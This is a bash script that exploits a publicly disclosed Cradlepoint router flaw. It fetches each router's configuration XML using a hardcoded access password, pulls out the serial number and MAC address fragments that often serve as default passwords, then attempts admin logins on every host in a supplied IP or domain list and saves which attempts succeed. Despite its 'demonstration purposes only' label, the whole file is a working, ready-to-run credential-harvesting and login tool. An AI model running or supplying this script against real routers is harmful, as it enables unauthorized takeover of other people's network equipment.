#!/usr/bin/env bash

################################################################
#                                                              #
# Script to pull potential default passwords and attempt       #
# to login to Cradlepoint Routers.                             #
#                                                              #
# Requires program 'curl'                                      #
#                                                              #
# Script pulls exposed config XML (if it exists) and parses    #
# the Cradlepoint serial number and last 4 octets of the MAC   #
# address (common default passwords). Then attempts to login   #
# with those default passwords.                                #
#                                                              #
#                                                              #
# Shoutout to CrazyOwl for disclosing this vuln!               #
# See https://seclists.org/fulldisclosure/2018/Nov/22 for more #
# info.                                                        #
#                                                              #
# Written by Tinker. For Demonstration Purposes Only.          #
#                                                              #
################################################################


USAGE="
Bash script to pull & parse Cradlepoint config XML and attempt logon.
For Demonstrational Purposes Only.

Flags:
  -f	File w/ IP Addresses or Domains of Cradlepoint Routers, separated by newline.
  -o	Output filename.
  -h	Help text and usage example.
  
usage:	 trylogonCradle.sh -f <IP/Domain list filename> -o <outputFileName.hash>
example: trylogonCradle.sh -f cradleIPs.txt -o cradleResults.txt
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi

# Set flags.
while getopts "f:o:h" FLAG
do
	case $FLAG in
		f)
			IPLIST=$OPTARG
			;;
		o)
			OUTPUT=$OPTARG
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done

# Make sure each required flag was actually set.
if [ -z ${IPLIST+x} ]; then
	echo "IP List / Domain List flag (-f) is not set."
	echo "$USAGE"
	exit
elif [ -z ${OUTPUT+x} ]; then
	echo "Output flag (-o) is not set."
	echo "$USAGE"
	exit
fi

###Functions###

# Pull XML Config, Parse, & Assign to Variables

get_xml ()
{
	SERIALNUM=$(curl -s -k "https://$IPADDR:8443/plt?password=W6rqCjk5ijRs6Ya5bv55" --connect-timeout 1 | grep SERIAL_NUM | cut -d ">" -f 2 | cut -d "<" -f 1)
	MACOCTET=$(curl -s -k "https://$IPADDR:8443/plt?password=W6rqCjk5ijRs6Ya5bv55" --connect-timeout 1 | grep WLAN_MAC | cut -d ">" -f 2 | cut -d "<" -f 1 | cut -d ":" -f 3-6 | sed 's/://g')
}

try_logon ()
{
	CHECK=$(curl -k --data-binary "cprouterusername=admin&cprouterpassword=$1" "https://$IPADDR:8443/login/do_auth" -v 2>&1 | grep Location | cut -d" " -f 3)
}

###MAIN###

while read IPADDR;
do	
	get_xml
	if [ $SERIALNUM ]; then try_logon $SERIALNUM; echo "Router:" $IPADDR";" "Serial Number:" $SERIALNUM";" "Attempt:" $CHECK; fi
	if [ $MACOCTET ]; then try_logon $MACOCTET; echo "Router:" $IPADDR";" "MAC Last4 Octets:" $MACOCTET";" "Attempt:" $CHECK; fi
done < $IPLIST | tee $OUTPUT

